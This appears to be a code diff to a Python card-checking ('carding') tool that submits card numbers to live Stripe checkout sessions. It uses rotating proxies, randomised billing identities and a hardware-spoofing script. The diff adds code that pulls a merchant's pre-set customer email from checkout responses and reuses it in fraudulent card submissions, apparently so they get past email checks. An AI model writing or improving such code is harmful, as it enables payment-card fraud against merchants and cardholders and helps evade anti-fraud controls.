@@ -112,7 +112,14 @@ class StripeAPIExtractor:
                     merchant = resp_json['statement_descriptor']
                     
                 currency = resp_json.get('currency', 'usd').upper()
-                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant}
+                
+                locked_email = None
+                if resp_json.get('customer_email'): locked_email = resp_json['customer_email']
+                elif resp_json.get('prefilled_email'): locked_email = resp_json['prefilled_email']
+                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('email'): locked_email = resp_json['customer']['email']
+                elif isinstance(resp_json.get('customer_details'), dict) and resp_json['customer_details'].get('email'): locked_email = resp_json['customer_details']['email']
+                
+                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email}
             return {'success': False}
         except: return {'success': False}
 
@@ -522,11 +529,12 @@ HARDWARE_SPOOF_SCRIPT = """
 """
 
 class StripeAPIHitter:
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
         self.raw_amount = raw_amount
+        self.locked_email = locked_email
         
     async def hit(self, card: Dict, attempt: int, user_id: int) -> Dict:
         start = time.time()
@@ -592,7 +600,7 @@ class StripeAPIHitter:
                     "card[exp_month]": card['month'],
                     "card[exp_year]": card['year'],
                     "billing_details[name]": RandomData.get_name(),
-                    "billing_details[email]": RandomData.get_email(),
+                    "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                     "billing_details[address][line1]": address["line1"],
                     "billing_details[address][city]": address["city"],
                     "billing_details[address][state]": address["state"],
@@ -998,6 +1006,7 @@ class ConcurrentHitter:
                             self.url_info['amount'] = api_data.get('amount')
                             self.url_info['raw_amount'] = api_data.get('raw_amount')
                             self.url_info['merchant'] = api_data.get('merchant')
+                            self.url_info['locked_email'] = api_data.get('locked_email')
                     return True
             except Exception as e:
                 continue
@@ -1017,7 +1026,7 @@ class ConcurrentHitter:
                 max_retries = 2
                 for try_idx in range(max_retries):
                     proxy_data = await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'))
+                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'), self.url_info.get('locked_email'))
                     result = await hitter.hit(card, attempt_num, self.user_id)
                     result['amount'] = self.url_info.get('amount')
                     result['merchant'] = self.url_info.get('merchant')
